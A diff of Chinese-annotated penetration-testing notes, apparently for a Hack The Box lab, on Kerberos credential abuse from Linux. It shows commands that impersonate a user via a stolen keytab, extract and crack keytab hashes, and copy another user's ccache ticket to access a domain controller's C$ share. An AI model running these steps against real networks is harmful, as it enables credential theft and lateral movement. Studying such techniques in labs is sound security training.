@@ -490,10 +490,25 @@ env | grep -i krb5      查看环境变量，确定 Kerberos 凭证缓存位置
 ls -la /tmp      ccache 文件默认位于 /tmp，以 root 或 特权用户身份访问
 
 
-klist -k -t /opt/specialfiles/carlos.keytab      看 carlos.keytab 文件，kinit 是区分大小写
+klist -k -t /opt/specialfiles/carlos.keytab                               看 carlos.keytab 文件
+klist                                                                     看 ccache 中的票据
+为了保留当前会话的票据，只用 kinit 导入 keytab 之前，保存环境变量 KRB5CCNAME 中存在的 ccache 文件的副本
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab      换掉当前票据，冒充 carlos （kinit 是区分大小写）
+smbclient //dc01/carlos -k -c ls                                          冒充 carlos 访问 smb
 
 
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab      使用 KeyTabExtract 提取 KeyTab 哈希
+  https://github.com/sosdave/KeyTabExtract
 
+https://crackstation.net/      在线哈希破解
+
+
+ls -la /tmp                                          看 ccache 文件，发现用户 julio@inlanefreight.htb
+id julio@inlanefreight.htb                           看用户信息
+cp /tmp/krb5cc_647401106_I8I133 .                    把 /tmp 下的票据缓存文件 krb5cc_647401106_I8I133 复制到当前目录
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133      设置环境变量 KRB5CCNAME，告诉 Kerberos 客户端库该文件作找票据，而不是默认的 /tmp/krb5cc_<uid>
+klist                                                列出，确认票据
+smbclient //dc01/C$ -k -c ls -no-pass                登录
 
 
 
